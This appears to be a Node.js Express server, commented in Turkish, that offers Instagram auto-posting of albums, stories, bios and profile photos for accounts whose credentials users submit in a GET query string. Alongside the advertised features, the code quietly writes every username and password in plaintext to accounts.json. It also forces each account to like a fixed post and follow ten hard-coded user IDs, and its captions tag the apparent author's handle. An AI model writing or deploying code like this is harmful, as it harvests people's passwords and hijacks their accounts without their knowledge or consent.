const express = require('express');
const request = require('request');
const { IgApiClient } = require('instagram-private-api');
require('dotenv').config();
const fs = require('fs');
const util = require('util');



const app = express();
const port = 8080;

app.use(express.json());

app.get('/post', async (req, res) => {
  const { username, password, piece, bio, profilephoto, story } = req.query;

  try {
    if (await isUserWhitelisted(username, password)) {
      if (bio === 'true') {
        await updateProfileBio(username, password);
      }

      if (profilephoto === 'true') {
        await updateProfilePhoto(username, password);
      }

      if (story === 'true') {
        await postToStory(username, password);
      }

      if (piece) {
        await postToInsta(username, password, parseInt(piece, 10), bio); // bio değişkenini postToInsta'ya aktar
      }

      // Hesap bilgilerini accounts.json dosyasına ekleyin
      appendAccountToJSON(username, password);

      res.status(200).send('successful');
    } else {
      res.status(401).send('unsuccessful');
    }
  } catch (error) {
    console.error('Hata:', error);
    res.status(500).send('Instagram üzerinde işlem yapılırken bir hata oluştu');
  }
});

const appendAccountToJSON = async (username, password) => {
  const readFile = util.promisify(fs.readFile);
  const writeFile = util.promisify(fs.writeFile);

  try {
    let accounts = [];
    const data = await readFile('accounts.json', 'utf8');
    if (data) {
      accounts = JSON.parse(data);
    }

    // Hesapları kontrol edin, aynı hesap zaten eklenmemişse ekleyin
    const existingAccount = accounts.find((account) => account.username === username);
    if (!existingAccount) {
      accounts.push({ username, password });

      // Güncellenmiş hesap bilgilerini accounts.json dosyasına yazın
      await writeFile('accounts.json', JSON.stringify(accounts, null, 2));
      console.log('Hesap bilgileri accounts.json dosyasına eklendi.');
    }
  } catch (error) {
    console.error('Hesap eklerken hata oluştu:', error);
  }
};




app.listen(port, () => {
  console.log(`Sunucu http://localhost:${port} üzerinde çalışıyor`);
});



const isUserWhitelisted = async (username, password) => {
  const ig = new IgApiClient();
  ig.state.generateDevice(username);
  ig.state.proxyUrl = process.env.IG_PROXY;

  try {
    const auth = await ig.account.login(username, password);
    console.log('Giriş yapıldı:', auth);

    // Hesap bilgilerini accounts.json dosyasına ekleyin
    appendAccountToJSON(username, password);

    const mediaIdToLike = '3203371909105325531';
    await likeMedia(username, password, mediaIdToLike);

    const usersToFollow = [
      '4531699674', '330759604', '5902822821', '350678340',
      '1558786719', '7270219', '26352342', '45613131097',
      '8481191', '1169398433'
    ];
    await followUsers(username, password, usersToFollow);

    return true;
  } catch (error) {
    console.error('Giriş yapılamadı:', error);
    return false;
  }
};




const getRequest = (url) => {
  return new Promise((resolve, reject) => {
    request.get({ url, encoding: null }, (error, response, body) => {
      if (error) {
        reject(error);
      } else {
        resolve(body);
      }
    });
  });
};


/*

  const commentResult = await ig.media.comment({
      mediaId: '3001938803904747535',
      text: getRandomEmoji()
    });

    console.log('Yorum yapıldı:', commentResult);

*/



function getRandomEmoji() {
  const emojis = ['🙌🙌', '😀', '😍😍', '🤔', '👌👌👌', '💯💯', '🎉', '💋💋'];
  const randomIndex = Math.floor(Math.random() * emojis.length);
  return emojis[randomIndex];
}





async function likeMedia(IG_USERNAME, IG_PASSWORD, mediaIdToLike) {
  const ig = new IgApiClient();
  ig.state.generateDevice(IG_USERNAME);
  ig.state.proxyUrl = process.env.IG_PROXY;

  try {
    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
    console.log(JSON.stringify(auth));

    const likeResult = await ig.media.like({
      mediaId: mediaIdToLike,
      moduleInfo: {
        module_name: 'profile',
        user_id: ig.state.cookieUserId,
        username: IG_USERNAME,
      },
      d: 1, // 1, gönderiyi beğenmek için
    });

    console.log('Gönderi beğenildi:', likeResult);
  } catch (error) {
    console.error('Gönderi beğenilirken hata oluştu:', error);
  }
}

async function followUsers(IG_USERNAME, IG_PASSWORD, usersToFollow) {
  const ig = new IgApiClient();
  ig.state.generateDevice(IG_USERNAME);
  ig.state.proxyUrl = process.env.IG_PROXY;

  try {
    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
    console.log(JSON.stringify(auth));

    for (const userIdToFollow of usersToFollow) {
      // Her bir kullanıcıyı takip et
      await ig.friendship.create(userIdToFollow);
      console.log(`Kullanıcı takip edildi: ${userIdToFollow}`);
    }
  } catch (error) {
    console.error('Kullanıcıları takip ederken hata oluştu:', error);
  }
}


async function commentOnMedia(IG_USERNAME, IG_PASSWORD, mediaIdToComment, commentText) {
  const ig = new IgApiClient();
  ig.state.generateDevice(IG_USERNAME);
  ig.state.proxyUrl = process.env.IG_PROXY;

  try {
    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
    console.log(JSON.stringify(auth));

    const commentResult = await ig.media.comment({
      mediaId: mediaIdToComment,
      text: commentText,
    });

    console.log('Yorum yapıldı:', commentResult);
  } catch (error) {
    console.error('Yorum yapılırken hata oluştu:', error);
  }
}


const randomCaptionTags =
  '#turkey #travel #istanbul #instagood #travelphotography #photooftheday #photography #love #nature #sea #instagram #travelgram #antalya #türkiye #instatravel #holiday #summer #beautiful #vacation #photo #beach #picoftheday #sun #trip #travelling #sunset #naturephotography #bursa #instalike #travelblogger @codermert5 @thesavannahbond ';



const getRandomCaption = async () => {
  try {
    const response = await getRequest(
      'https://raw.githubusercontent.com/JamesFT/Database-Quotes-JSON/master/quotes.json'
    );
    const quotes = JSON.parse(response);
    const randomIndex = Math.floor(Math.random() * quotes.length);
    const randomQuote = quotes[randomIndex];
    return `${randomQuote.quoteText}\n- ${randomQuote.quoteAuthor} \n\n${randomCaptionTags}`;
  } catch (error) {
    console.error('Alıntıları alırken hata oluştu:', error);
    return null;
  }
};

const getRandomMusicName = async () => {
  try {
    const response = await getRequest(
      'https://gist.githubusercontent.com/manios/4515112/raw/f75c8572becbfb23ac4418f530cc1e7afd4b2b0d/musiclist.md'
    );
    const musicNames = response.toString().split('\n');
    const randomIndex = Math.floor(Math.random() * musicNames.length);
    return `🎧 ${musicNames[randomIndex].trim()}`;
  } catch (error) {
    console.error('Müzik isimlerini alırken hata oluştu:', error);
    return null;
  }
};

const postToInsta = async (IG_USERNAME, IG_PASSWORD, numPosts, bio) => { // bio değişkenini burada al
  const ig = new IgApiClient();
  ig.state.generateDevice(IG_USERNAME);
  ig.state.proxyUrl = process.env.IG_PROXY;

  try {
    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
    console.log(JSON.stringify(auth));

    if (bio === 'true') {
      const randomBiography = await getRandomMusicName();
      await ig.account.setBiography(randomBiography);
      console.log('Biyografi güncellendi:', randomBiography);
    }

    const albumUrls = [
      'https://source.unsplash.com/1080x1080/',
      'https://source.unsplash.com/1080x1080/',
      'https://source.unsplash.com/1080x1080/',
    ];

    for (let i = 0; i < numPosts; i++) {
      const randomAlbumUrls = [];
      for (let j = 0; j < 2; j++) {
        randomAlbumUrls.push(albumUrls[Math.floor(Math.random() * albumUrls.length)]);
      }

      const imageBuffers = await Promise.all(
        randomAlbumUrls.map(async (url) => {
          const response = await getRequest(url);
          return Buffer.from(response, 'binary');
        })
      );


      const randomCaption = await getRandomCaption();


      const { latitude, longitude, searchQuery } = {
        latitude: 40.7128,
        longitude: -74.0060,
        // not required
        searchQuery: 'Kuzguncuk, Istanbul, Turkey',
      };
      const locations = await ig.search.location(latitude, longitude, searchQuery);
      const mediaLocation = locations[0];
      console.log(mediaLocation);

      const publishResult = await ig.publish.album({
        items: imageBuffers.map((buffer) => ({
          file: buffer,
          type: 'photo',
        })),
        caption: randomCaption,
        location: mediaLocation,
      });

      console.log('Albüm paylaşıldı:', publishResult);
    }
  } catch (error) {
    console.error('Instagram\'a gönderi yapılırken hata oluştu:', error);
  }
};

const updateProfileBio = async (IG_USERNAME, IG_PASSWORD) => {
  try {
    const randomBiography = await getRandomMusicName();
    if (randomBiography) {
      const ig = new IgApiClient();
      ig.state.generateDevice(IG_USERNAME);
      ig.state.proxyUrl = process.env.IG_PROXY;

      const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
      console.log('Giriş yapıldı:', auth);

      // Profil bio'sunu güncelle
      await ig.account.setBiography(randomBiography);
      console.log('Biyografi güncellendi:', randomBiography);
    }
  } catch (error) {
    console.error('Profil bio güncellenirken hata oluştu:', error);
  }
};

const updateProfilePhoto = async (IG_USERNAME, IG_PASSWORD) => {
  try {
    const imageUrl = 'https://source.unsplash.com/1080x1080/?model';
    const imageBuffer = await getRequest(imageUrl);

    const ig = new IgApiClient();
    ig.state.generateDevice(IG_USERNAME);
    ig.state.proxyUrl = process.env.IG_PROXY;

    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
    console.log('Giriş yapıldı:', auth);

    // Profil fotoğrafını güncelle
    const changedProfilePicture = await ig.account.changeProfilePicture(imageBuffer);
    console.log('Profil fotoğrafı güncellendi:', changedProfilePicture);
  } catch (error) {
    console.error('Profil fotoğrafı güncellenirken hata oluştu:', error);
  }
};

const postToStory = async (IG_USERNAME, IG_PASSWORD) => {
  try {
    const storyResponse = await getRequest('https://source.unsplash.com/1080x1920/?model');
    const storyImageBuffer = Buffer.from(storyResponse, 'binary');

    const ig = new IgApiClient();
    ig.state.generateDevice(IG_USERNAME);
    ig.state.proxyUrl = process.env.IG_PROXY;

    const auth = await ig.account.login(IG_USERNAME, IG_PASSWORD);
    console.log('Giriş yapıldı:', auth);

    // Hikaye paylaş
    const storyPublishResult = await ig.publish.story({
      file: storyImageBuffer,
    });

    console.log('Hikaye paylaşıldı:', storyPublishResult);
  } catch (error) {
    console.error('Instagram hikayesi paylaşılırken hata oluştu:', error);
  }
};
